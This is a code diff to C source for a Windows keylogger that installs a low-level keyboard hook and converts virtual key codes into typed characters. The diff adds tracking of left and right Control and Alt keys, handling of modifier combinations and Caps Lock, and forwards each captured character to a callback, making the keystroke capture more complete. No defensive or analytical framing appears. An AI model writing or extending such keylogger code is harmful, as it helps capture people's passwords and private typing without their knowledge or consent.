@@ -5,6 +5,8 @@ keyloggerCallback callback;
 HHOOK keyboardHook = NULL;
 
 u8 lShiftPressed = 0, rShiftPressed = 0, keyAfterShift = 1;
+u8 lControlPressed = 0, rControlPressed = 0, keyAfterControl = 1;
+u8 lAltPressed = 0, rAltPressed = 0, keyAfterAlt = 1;
 char chr[65] = {0};
 HKL lastKeyboardLayout;
 
@@ -35,7 +37,7 @@ void toLowerCase(char* buffer) {
 }
 
 int getKeyName(u32 vkCode, char* buffer, u32 size) {
-    u32 vsc = MapVirtualKeyEx(vkCode, 0, GetKeyboardLayout(0)); //MAPVK_VK_TO_VSC
+    u32 vsc = MapVirtualKey(vkCode, 0); //MAPVK_VK_TO_VSC
     switch (vkCode) {
         case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
         case VK_PRIOR: case VK_NEXT:
@@ -55,19 +57,31 @@ int getKeyName(u32 vkCode, char* buffer, u32 size) {
 
 void dictionary(u32 key) {
     memset(chr, 0, 65);
-    u8 test = MapVirtualKeyEx(key, 2, GetKeyboardLayout(0)); //MAPVK_VK_TO_CHAR
-    if ((test >= 0x41 && test <= 0x5A) || (test >= 0x61 && test <= 0x7A) ||
-        (test >= 0xC0 && test <= 0xDD) || (test >= 0xE0 && test <= 0xFD)) {
-        keyAfterShift = 1;
-    }
-    if ((test >= 0x20 && test <= 0xFE) && test != 0x7F) { //Check if is printable
+    u8 test = MapVirtualKey(key, 2); //MAPVK_VK_TO_CHAR
+    u8 shift = 0, alt = 0, control = 0;
+    if (lShiftPressed == 1 || rShiftPressed == 1) shift = 1;
+    if (lAltPressed == 1 || rAltPressed == 1) alt = 1;
+    if (lControlPressed == 1 || rControlPressed == 1) control = 1;
+    char ret = getCharFromCombination(key, control, alt, shift);
+    if (ret > 9) {
+        if (shift == 1) keyAfterShift = 1;
+        if (alt == 1) keyAfterAlt = 1;
+        if (control == 1) keyAfterControl = 1;
+        chr[0] = ret;
+        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
+            if (shift == 1) toLowerCase(chr);
+            if (shift == 0) toUpperCase(chr);
+        }
+    } else if ((test >= 0x20 && test <= 0xFE) && test != 0x7F) { //Check if is printable
+        if ((test >= 0x41 && test <= 0x5A) || (test >= 0x61 && test <= 0x7A) ||
+            (test >= 0xC0 && test <= 0xDD) || (test >= 0xE0 && test <= 0xFD)) {
+            keyAfterShift = 1;
+        }
         u8 isCap = 0;
         if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
             isCap = 1;
         }
-        if (lShiftPressed == 1 || rShiftPressed == 1) {
-            isCap = 1 - isCap;
-        }
+        if (shift == 1) isCap = 1 - isCap;
         chr[0] = test;
         if (isCap == 1) {
             toUpperCase(chr);
@@ -109,6 +123,18 @@ LRESULT CALLBACK keyloggerHook(int code, WPARAM wParam, LPARAM lParam) {
             } else if (key->vkCode == VK_RSHIFT) {
                 rShiftPressed = 1;
                 keyAfterShift = 0;
+            } else if (key->vkCode == VK_LCONTROL) {
+                lControlPressed = 1;
+                keyAfterControl = 0;
+            } else if (key->vkCode == VK_RCONTROL) {
+                rControlPressed = 1;
+                keyAfterControl = 0;
+            } else if (key->vkCode == VK_LMENU) {
+                lAltPressed = 1;
+                keyAfterAlt = 0;
+            } else if (key->vkCode == VK_RMENU) {
+                rAltPressed = 1;
+                keyAfterAlt = 0;
             } else {
                 dictionary(key->vkCode);
                 callback(chr);
@@ -125,6 +151,34 @@ LRESULT CALLBACK keyloggerHook(int code, WPARAM wParam, LPARAM lParam) {
                 rShiftPressed = 0;
                 if (keyAfterShift == 0) {
                     keyAfterShift = 1;
+                    dictionary(key->vkCode);
+                    callback(chr);
+                }
+            } else if (key->vkCode == VK_LCONTROL) {
+                lControlPressed = 0;
+                if (keyAfterControl == 0) {
+                    keyAfterControl = 1;
+                    dictionary(key->vkCode);
+                    callback(chr);
+                }
+            } else if (key->vkCode == VK_RCONTROL) {
+                rControlPressed = 0;
+                if (keyAfterControl == 0) {
+                    keyAfterControl = 1;
+                    dictionary(key->vkCode);
+                    callback(chr);
+                }
+            } else if (key->vkCode == VK_LMENU) {
+                lAltPressed = 0;
+                if (keyAfterAlt == 0) {
+                    keyAfterAlt = 1;
+                    dictionary(key->vkCode);
+                    callback(chr);
+                }
+            } else if (key->vkCode == VK_RMENU) {
+                rAltPressed = 0;
+                if (keyAfterAlt == 0) {
+                    keyAfterAlt = 1;
                     dictionary(key->vkCode);
                     callback(chr);
                 }
